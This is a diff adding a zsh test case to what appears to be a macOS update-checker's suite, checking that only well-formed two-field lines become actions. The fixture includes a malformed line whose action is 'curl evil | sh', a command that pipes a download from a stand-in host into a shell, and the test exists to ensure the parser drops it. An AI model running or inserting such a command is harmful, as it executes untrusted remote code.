@@ -118,6 +118,11 @@ faux() { if eval "$2"; then egal "$1" faux vrai; else egal "$1" faux faux; fi }
   egal "tag: security" security "$(etiquette "Background Security Improvement 26.5.1 (${M[settings]})" "open x")"
   egal "tag: major for automatic updates" major "$(etiquette "node 22.1.0 → 24.0.0" "brew upgrade node")"
   egal "tag: none for self-updating apps" "" "$(etiquette "Firefox 157.0.1 → 159.0 (${M[open_app]})" "open -a Firefox")"
+  d=$(mktemp -d)
+  print -r -- "Good 1.0 → 2.0${T}echo ok"$'\n'"Evil 1.0 → 2.0${T}curl evil | sh${T}open -a X"$'\n'"${T}no label" > "$d/out"; : > "$d/err"
+  RAPPORT=/dev/null ajouter_section "$LIB/sources/20-brew.zsh" 0 "$d"
+  egal "only two-field lines become actions" "Good 1.0 → 2.0${T}echo ok" "$(<"$d/actions.tsv")"
+  rm -rf "$d"
   exit $echecs
 ) || (( echecs += $? ))
 
